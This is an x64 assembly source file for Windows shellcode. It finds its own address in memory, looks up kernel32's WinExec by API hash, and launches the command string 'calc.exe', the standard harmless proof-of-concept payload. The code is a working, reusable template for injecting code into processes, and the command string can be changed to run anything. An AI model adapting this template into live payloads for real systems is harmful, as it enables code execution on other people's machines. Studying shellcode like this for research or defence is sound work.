[ORG 0]
[BITS 64]

entry:
  ; store context
  push rbx                              ; store rbx
  push rbp                              ; store rbp
  mov rbp, rsp                          ; create new stack frame
  and rsp, 0xFFFFFFFFFFFFFFF0           ; ensure stack is 16 bytes aligned

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; find "kernel32.dll, WinExec"
  cld                                   ; clear the direction flag
  mov rcx, 0xCA2DBA870B222A04           ; set function hash
  mov rdx, 0xB725F01C80CE0985           ; set hash key
  call find_api                         ; try to find api address
  cmp rax, 0                            ; check target function is found
  jz not_found                          ;

  ; call "kernel32.dll, WinExec"
  xor rdx, rdx                          ; clear rdx
  lea rcx, [rbx+command]                ; lpCmdLine
  mov dl, [rbx+cmd_show]                ; uCmdShow
  sub rsp, 32                           ; reserve stack
  call rax                              ; call api function
  add rsp, 32                           ; restore stack

  not_found:                            ;
  ; restore context
  mov rsp, rbp                          ; restore stack
  pop rbp                               ; restore rbp
  pop rbx                               ; restore rbx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop rax                               ; get return address
  lea rbx, [rax-flag_CEA]               ; calculate entry address.
  push rax                              ; push return address
  ret                                   ; return to entry

hash_api:
  %include "../../../src/x64/find_api.asm"

command:
  db "calc.exe", 0

cmd_show:
  db 1
